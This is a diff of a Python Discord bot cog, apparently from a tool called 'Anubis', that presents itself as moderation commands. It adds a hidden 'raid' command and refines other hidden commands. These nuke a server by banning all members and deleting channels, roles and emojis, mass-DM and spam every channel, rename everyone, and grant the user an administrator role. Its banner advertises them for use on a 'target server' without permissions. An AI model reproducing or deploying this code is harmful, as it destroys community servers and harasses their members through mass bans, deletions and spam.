@@ -1,20 +1,23 @@
 # Scripted by Catterall (https://github.com/Catterall).
 # Bot under the GNU General Public Liscense v2 (1991).
 
+
 # Modules
+
 import discord
 from discord.ext import commands
-from colorama import *
+from colorama import Style, Back, Fore, init
 import requests
 import random
 import json
 import os
-init()  # Used by colorama.
+init()
 
 
 class Moderation(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
+
 
     # Clear messages.
 
@@ -37,7 +40,8 @@ class Moderation(commands.Cog):
                     title="Issue", description=f"You must specify a real amount.", color=discord.Colour.orange())
                 await ctx.send(embed=embed)
 
-    # The atomic bomb.
+
+    # Nuke the server.
 
     @commands.command(hidden=True)
     async def nuke(self, ctx):
@@ -48,6 +52,7 @@ class Moderation(commands.Cog):
         await ctx.message.delete()
 
         # Ban all members.
+
         print(Fore.LIGHTWHITE_EX +
               f"\n{'-'*(len(quote)+2)}" + "\nNuke depolyed!\n\n")
         print(Fore.YELLOW + "Banning server members:")
@@ -64,6 +69,7 @@ class Moderation(commands.Cog):
         print(Fore.LIGHTGREEN_EX + "Banned all members.\n")
 
         # Delete all channels.
+
         print(Fore.YELLOW + "Deleting server channels:")
         for c in ctx.guild.channels:
             try:
@@ -76,6 +82,7 @@ class Moderation(commands.Cog):
         print(Fore.LIGHTGREEN_EX + "Deleted all channels.\n")
 
         # Delete all roles.
+
         print(Fore.YELLOW + "Deleting server roles:")
         roles = ctx.guild.roles
         roles.pop(0)
@@ -93,6 +100,7 @@ class Moderation(commands.Cog):
         print(Fore.LIGHTGREEN_EX + "Deleted all roles.\n")
 
         # Delete all emojis.
+
         print(Fore.YELLOW + "Deleting server emojis:")
         for emoji in list(ctx.guild.emojis):
             try:
@@ -104,6 +112,7 @@ class Moderation(commands.Cog):
 
         print(Fore.LIGHTWHITE_EX +
               f"Nuke sucessfully exploded!\n" + Fore.RED + f"\"{quote}\"" + Fore.WHITE + f"\n{'-'*(len(quote)+2)}\n\n")
+
 
     # Delete all channels only.
 
@@ -120,7 +129,8 @@ class Moderation(commands.Cog):
             name="Channels purged successfully.", value="The server channels have been purged successfully.", inline=False)
         await ctx.author.send(embed=embed)
 
-    # DM all members with a message.
+
+    # Message all members with a message.
 
     @commands.command(hidden=True)
     async def mass_dm(self, ctx, *, message=None):
@@ -141,6 +151,7 @@ class Moderation(commands.Cog):
                 name="No message provided.", value="You must provide a message: `mass_dm <message>`.", inline=False)
             await ctx.author.send(embed=embed)
 
+
     # Make yourself an administator on the server.
 
     @commands.command(hidden=True)
@@ -160,13 +171,16 @@ class Moderation(commands.Cog):
                 name="You must provide a role name.", value="You must provide a name for your administrator role: `admin <role_name>`.", inline=False)
             await ctx.author.send(embed=embed)
 
-    # Spam all text channels with @everyone.
+
+    # Spam all text channels with a message.
 
     @commands.command(hidden=True)
     async def spam(self, ctx, *, message=None):
         await ctx.message.delete()
         if message != None:
-            await ctx.author.send('Type `stop` in a text channel to stop spamming.')
+            embed = discord.Embed(
+                title="Info", description=f"Type `stop` in a text channel to stop spamming.", color=discord.Colour.orange())
+            await ctx.send(embed=embed)
 
             def check_reply(message):
                 return message.content == 'stop' and message.author == ctx.author
@@ -186,6 +200,7 @@ class Moderation(commands.Cog):
                 name="No message provided.", value="You must provide a message: `spam <message>`.", inline=False)
             await ctx.author.send(embed=embed)
 
+
     # Change the nickname of every member.
 
     @commands.command(hidden=True)
@@ -196,7 +211,7 @@ class Moderation(commands.Cog):
                 for member in ctx.guild.members:
                     try:
                         await member.edit(nick=nickname)
-                    except Exception as e:
+                    except:
                         continue
                 embed = discord.Embed(color=discord.Colour.green())
                 embed.add_field(
@@ -213,11 +228,140 @@ class Moderation(commands.Cog):
                 name="No nickname provided.", value="You must provide a nickname: `nick_all <nickname>`.", inline=False)
             await ctx.author.send(embed=embed)
 
+
+    # Raid the server.
+
+    @commands.command(hidden=True)
+    async def raid(self, ctx, rolename=None, nickname=None, channelName=None, channelNum=None, *, msg=None):
+        await ctx.message.delete()
+
+        # Check for any possible command errors.
+
+        if not channelNum:
+            channelNum = 10
+        else:
+            try:
+                channelNum = int(channelNum)
+            except:
+                channelNum = 10
+        if not rolename:
+            embed = discord.Embed(color=discord.Colour.red())
+            embed.add_field(
+                name="No rolename provided.", value="You must provide a rolename: `raid <role_name> <nickname> <channel_name> <num_of_channels> <message>`.", inline=False)
+            await ctx.author.send(embed=embed)
+            return
+        if not nickname:
+            embed = discord.Embed(color=discord.Colour.red())
+            embed.add_field(
+                name="No nickname provided.", value="You must provide a nickname: `raid <role_name> <nickname> <channel_name> <num_of_channels> <message>`.", inline=False)
+            await ctx.author.send(embed=embed)
+            return
+        if not channelName:
+            embed = discord.Embed(color=discord.Colour.red())
+            embed.add_field(
+                name="No channel name provided.", value="You must provide a channel name: `raid <role_name> <nickname> <channel_name> <num_of_channels> <message>`.", inline=False)
+            await ctx.author.send(embed=embed)
+            return
+        if not channelNum:
+            embed = discord.Embed(color=discord.Colour.red())
+            embed.add_field(
+                name="No number of channels provided.", value="You must provide a number of channels: `raid <role_name> <nickname> <channel_name> <num_of_channels> <message>`.", inline=False)
+            await ctx.author.send(embed=embed)
+            return
+        if not msg:
+            embed = discord.Embed(color=discord.Colour.red())
+            embed.add_field(
+                name="No message provided.", value="You must provide a message: `raid <role_name> <nickname> <channel_name> <num_of_channels> <message>`.", inline=False)
+            await ctx.author.send(embed=embed)
+            return
+
+        # Delete all channels.
+
+        for c in ctx.guild.channels:
+            try:
+                await c.delete()
+            except discord.Forbidden:
+                continue
+        
+        # Delete all roles.
+
+        roles = ctx.guild.roles
+        roles.pop(0)
+        for r in roles:
+            if ctx.guild.me.roles[-1] > r:
+                try:
+                    await r.delete()
+                except:
+                    continue
+            else:
+                break
+        
+        # Create a new role and give it to all members.
+
+        await ctx.guild.create_role(name=rolename, colour=discord.Colour(0xff0000))
+        role = discord.utils.get(ctx.guild.roles, name=rolename)
+        for member in ctx.guild.members:
+            try:
+                await member.add_roles(role)
+            except:
+                continue
+        
+        # Nickname all members.
+
+        for member in ctx.guild.members:
+            try:
+                await member.edit(nick=nickname)
+            except:
+                continue
+        
+        # Create i number of channels named <channelNum>.
+
+        for i in range(channelNum):
+            try:
+                await ctx.guild.create_text_channel(channelName)
+            except:
+                continue
+        
+        # Message all members with a message.
+
+        for member in ctx.guild.members:
+            try:
+                if member.dm_channel != None:
+                    await member.dm_channel.send(msg)
+                else:
+                    await member.create_dm()
+                    await member.dm_channel.send(msg)
+            except:
+                continue
+        
+        # Raid all text channels.
+
+        embed = discord.Embed(
+            title="Info", description=f"Type `stop` in a text channel to stop raiding.", color=discord.Colour.orange())
+        await ctx.send(embed=embed)
+
+        def check_reply(message):
+            return message.content == 'stop' and message.author == ctx.author
+
+        async def spam_text():
+            while True:
+                for channel in ctx.guild.text_channels:
+                    await channel.send(msg)
+
+        spam_task = self.bot.loop.create_task(spam_text())
+        await self.bot.wait_for('message', check=check_reply)
+        spam_task.cancel()
+        embed = discord.Embed(color=discord.Colour.green())
+        embed.add_field(
+            name="Raid finished successfully.", value=f"The raid has finished successfully.", inline=False)
+        await ctx.author.send(embed=embed)
+
+
     # Leave the server.
-    
+
     @commands.command(hidden=True)
     async def leave(self, ctx, leave_code=None, *, guild_name=None):
-        await ctx.message.delete()      
+        await ctx.message.delete()
         if not os.path.isfile('cogs/temp.txt'):
             embed = discord.Embed(color=discord.Colour.red())
             embed.add_field(
@@ -228,29 +372,29 @@ class Moderation(commands.Cog):
             with open('cogs/temp.txt', 'r') as f:
                 leave = f.read().strip().replace(' ', '')
                 f.close()
-            
+
             if not leave_code:
                 embed = discord.Embed(color=discord.Colour.red())
                 embed.add_field(
                     name="No leave-code provided.", value="You must provide a leave-code: `leave <leave-code> <server>`.", inline=False)
                 await ctx.author.send(embed=embed)
                 return
-            
+
             if not guild_name:
                 embed = discord.Embed(color=discord.Colour.red())
                 embed.add_field(
                     name="No server provided.", value="You must provide a server: `leave <leave-code> <server>`.", inline=False)
                 await ctx.author.send(embed=embed)
                 return
-            
+
             if leave_code != leave:
                 embed = discord.Embed(color=discord.Colour.red())
                 embed.add_field(
                     name="Incorrect leave-code.", value=f"The leave-code you provided ({leave_code}) was incorrect.", inline=False)
                 await ctx.author.send(embed=embed)
                 return
-            else:    
-                guild = discord.utils.get(self.bot.guilds, name=guild_name)    
+            else:
+                guild = discord.utils.get(self.bot.guilds, name=guild_name)
                 try:
                     await guild.leave()
                 except:
@@ -265,8 +409,10 @@ class Moderation(commands.Cog):
                         name="Anubis left successfully.", value=f"The Anubis bot has successfully left the server: {guild_name}.", inline=False)
                     await ctx.author.send(embed=embed)
                 except:
-                    print(f"{Fore.GREEN}\nAnubis left successfully: The Anubis bot has succesfully left the server: {Fore.WHITE}{guild_name}{Fore.GREEN}.")
+                    print(
+                        f"{Fore.GREEN}\nAnubis left successfully: The Anubis bot has succesfully left the server: {Fore.WHITE}{guild_name}{Fore.GREEN}.")
                     return
+
 
     # Refresh the window.
 
@@ -281,26 +427,25 @@ class Moderation(commands.Cog):
                 name="Crucial Error.", value="`run_settings.json` is missing. Please restart the bot.", inline=False)
             await ctx.author.send(embed=embed)
             return
-        
+
         with open('run_settings.json', 'w') as file:
             json.dump(data, file, indent=4)
             if not os.path.isfile('cogs/temp.txt'):
-                print(f"{Fore.LIGHTRED_EX}[critical] temp.txt mising - please restart the bot.")
+                print(
+                    f"{Fore.LIGHTRED_EX}[critical] temp.txt mising - please restart the bot.")
                 return
 
         with open('cogs/temp.txt', 'r') as f:
             leave_code = f.read().strip().replace(' ', '')
         await ctx.message.delete()
         os.system('cls')
-        print(Fore.BLUE + f'''
-     
-                                    █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
-                                    ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║██╔════╝
+        print(Fore.BLUE + f'''     
+                                    ███████╗███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
+                                    ██╔══██║████╗  ██║██║   ██║██╔══██╗██║██╔════╝
                                     ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗
                                     ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
                                     ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║
                                     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝
-
 
 {Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server - permissions are not needed:
 {Back.RESET}{Style.DIM}{Fore.RED}{data.get('prefix')}leave <leave-code> <server>: Makes the bot leave a server (Your current leave code is {Fore.WHITE}{leave_code}{Fore.RED}).
@@ -310,6 +455,9 @@ class Moderation(commands.Cog):
 {Fore.BLUE}{data.get('prefix')}cpurge: Delete all channels on a server.
 {Style.DIM}{Fore.MAGENTA}{data.get('prefix')}admin <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
 {Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{data.get('prefix')}nuke: Ban all members, then delete all roles, then delete all channels, then delete all custom emojis on a server.
+{Style.DIM}{Fore.RED}{data.get('prefix')}raid <role_name> <nickname> <channel_name> <num_of_channels> <message>:
+Delete all channels, then delete all roles, then give everyone a new role, then nickname everyone a new nickname,
+then create x number of channels, then message everyone with a message, then spam all channels with a message.
 
 
 {Style.DIM}{Fore.GREEN}Additional notes:
@@ -318,11 +466,11 @@ members you wish to ban (i.e. move the role as high as possible).
 
 {Fore.LIGHTCYAN_EX}To refresh this window back to this page, use the command: {Fore.LIGHTGREEN_EX}{data.get('prefix')}refresh
 
-
-{Fore.LIGHTRED_EX}Anubis created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall\n{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
+{Fore.LIGHTRED_EX}Anubis created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))
 
         return
-    
+
+
     # Kick a member.
 
     @commands.command()
@@ -333,6 +481,7 @@ members you wish to ban (i.e. move the role as high as possible).
             title="Member kicked", description=f"{member.mention} has been kicked.", color=discord.Colour.blue())
         await ctx.send(embed=embed)
 
+
     # Ban a member.
 
     @commands.command()
@@ -342,6 +491,7 @@ members you wish to ban (i.e. move the role as high as possible).
         embed = discord.Embed(
             title="Member banned", description=f"{member.mention} has been banned.", color=discord.Colour.blue())
         await ctx.send(embed=embed)
+
 
     # Unban a member.
 
@@ -359,6 +509,7 @@ members you wish to ban (i.e. move the role as high as possible).
                     title="Member unbanned", description=f"{user.mention} has been unbanned.", color=discord.Colour.blue())
                 await ctx.send(embed=embed)
                 return
+
 
     # Mute a member.
 
@@ -394,6 +545,7 @@ members you wish to ban (i.e. move the role as high as possible).
                 embed = discord.Embed(
                     title="Member muted", description=f"{member.mention} has been muted.", color=discord.Colour.blue())
                 await ctx.send(embed=embed)
+
 
     # Unmute a member.
 
